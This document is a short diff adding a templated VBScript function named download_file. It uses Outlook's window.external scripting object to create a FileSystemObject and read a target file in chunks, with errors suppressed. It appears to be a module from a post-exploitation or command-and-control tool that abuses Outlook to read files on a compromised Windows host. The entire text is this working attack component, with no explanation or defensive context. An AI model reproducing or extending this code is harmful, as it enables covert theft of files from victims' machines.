@@ -1,0 +1,12 @@
+Function download_file()
+	On Error Resume Next
+	Set fs = window.external.OutlookApplication.CreateObject("Scripting.FileSystemObject")
+	Set file = fs.GetFile({{file}})
+	if IsNull(file) Then Exit Function
+	    With file.OpenAsTextStream()
+	    .Skip({{startloc}})
+        readBinary = .Read({{chunksize}})
+        .Close
+    End With
+    download_file = readBinary
+End Function
